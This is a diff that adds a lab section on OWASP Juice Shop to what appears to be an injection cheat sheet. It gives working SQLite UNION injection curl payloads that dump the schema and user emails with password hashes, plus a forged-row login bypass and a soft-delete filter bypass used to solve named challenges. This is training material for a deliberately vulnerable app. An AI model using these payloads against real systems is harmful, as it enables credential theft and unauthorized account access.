@@ -163,6 +163,57 @@ admin'--
 ' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()--
 ```
 
+### Lab Tradecraft — OWASP Juice Shop (SQLite backend)
+
+> Juice Shop ships a **SQLite** datastore (not MySQL/Postgres), an Angular SPA whose route guards and form validation are **client-side only**, and an auto-generated Sequelize-backed CRUD layer exposed at `/api/{Model}` and `/rest/{noun}`. Base URL: `http://localhost:3000`. Because the DB is SQLite, schema lives in `sqlite_master` — there is **no `information_schema`** to query. Use these SQLite-specific UNION primitives instead of the MySQL ones above.
+
+**1. UNION-based SQLi in product search `/rest/products/search?q=` (Database Schema + User Credentials):**
+The `q` parameter is concatenated into a raw SQL `WHERE` clause. Confirm injection, then match the column count of the underlying `SELECT * FROM Products`.
+```bash
+# Confirm injection — closing the string + comment throws/changes the result set
+curl "http://localhost:3000/rest/products/search?q=test')--"
+
+# Column-count matching: walk NULLs until the 200 with a clean JSON array returns
+# (Products has 9 selected columns; the union arm must match arity AND a printable text column)
+curl "http://localhost:3000/rest/products/search?q=qwert')) UNION SELECT NULL--"
+curl "http://localhost:3000/rest/products/search?q=qwert')) UNION SELECT NULL,NULL--"
+# ... extend NULLs until no arity error ...
+
+# SQLite version (sanity confirmation that backend is SQLite, not MySQL)
+curl "http://localhost:3000/rest/products/search?q=qwert')) UNION SELECT sqlite_version(),2,3,4,5,6,7,8,9--"
+
+# Dump the schema from sqlite_master  ->  challenge: "Database Schema"
+curl "http://localhost:3000/rest/products/search?q=qwert')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--"
+
+# Dump all users  ->  challenge: "User Credentials" (exfil email + md5 password hashes)
+curl "http://localhost:3000/rest/products/search?q=qwert')) UNION SELECT id,email,password,'4','5','6','7','8','9' FROM Users--"
+```
+- Unlocks: **Database Schema** (full DDL via `sqlite_master.sql`) and **User Credentials** (email + password-hash exfil via UNION on `Users`).
+- Note: arity/quote-nesting (`')`, `'))`) varies by Juice Shop version — diff the JSON `data` array length against the baseline to lock the exact column count rather than guessing.
+
+**2. Fabricated-row UNION auth bypass on `/rest/user/login` (Ephemeral Accountant):**
+The login query is `SELECT * FROM Users WHERE email='<input>' AND password='<md5>' AND deletedAt IS NULL`. A UNION arm lets you forge a row whose `email` is an account that does not exist, satisfying the post-query role/email check without any password.
+```bash
+curl -X POST http://localhost:3000/rest/user/login \
+  -H 'Content-Type: application/json' \
+  --data '{"email":"' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,'acc0unt4nt@juice-sh.op',13,14,15,16,17,18,19 FROM Users--","password":"x"}'
+```
+- The forged row injects `acc0unt4nt@juice-sh.op` into the result's email column; the app issues a session for an account that was never persisted. Unlocks: **Ephemeral Accountant**.
+- Column positions/count must match the `Users` table shape for the running version — adjust the literal column index that carries the email string until the returned token decodes to the accountant identity.
+
+**3. Soft-delete (`deletedAt`) filter bypass — order a retired product (Christmas Special):**
+Juice Shop soft-deletes the "Christmas Super-Surprise-Box" by setting `deletedAt` instead of removing the row; the search query filters `deletedAt IS NULL`. Inject through `/rest/products/search?q=` to neutralize that filter and recover the deleted product's `id`, then place an order for it.
+```bash
+# Reveal soft-deleted rows by OR-ing the deletedAt filter true
+curl "http://localhost:3000/rest/products/search?q=qwert')) UNION SELECT id,name,description,price,deluxePrice,image,createdAt,updatedAt,deletedAt FROM Products WHERE deletedAt IS NOT NULL--"
+
+# Take the recovered product id (e.g. 10) and add it to the basket via the auto-CRUD REST layer
+curl -X POST http://localhost:3000/api/BasketItems \
+  -H 'Content-Type: application/json' -H "Authorization: Bearer <JWT>" \
+  --data '{"ProductId":10,"BasketId":<yourBasketId>,"quantity":1}'
+```
+- Unlocks: **Christmas Special** (complete an order that includes the soft-deleted Christmas product). This pairs SQLi (find the hidden row) with the exposed auto-CRUD `/api/BasketItems` endpoint, which has no server-side check that the product is still purchasable — a recurring Juice Shop pattern where the Angular client hides items but the REST layer does not enforce it.
+
 **NoSQL Injection (MongoDB):**
 ```javascript
 // JSON body injection
